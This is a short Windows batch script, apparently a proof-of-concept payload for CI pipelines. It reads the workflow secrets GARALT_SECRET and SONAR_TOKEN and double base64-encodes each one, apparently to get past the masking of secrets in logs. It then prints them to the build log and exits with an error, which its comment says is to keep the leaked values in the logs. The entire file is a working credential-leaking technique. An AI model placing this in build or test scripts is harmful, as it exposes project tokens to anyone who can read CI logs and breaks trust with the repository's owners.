@echo off
REM Leak GARALT_SECRET (toy secret from workflow env)
powershell -Command "$v=$env:GARALT_SECRET; $b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($v)); $bb=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($b)); Write-Host \"GARALT_LEAKED_TOKEN=$bb\""
REM Leak SONAR_TOKEN (step-level secret)
powershell -Command "$v=$env:SONAR_TOKEN; $b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($v)); $bb=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($b)); Write-Host \"GARALT_LEAKED_TOKEN=$bb\""
REM Exit to preserve leaked data in logs
exit /b 1
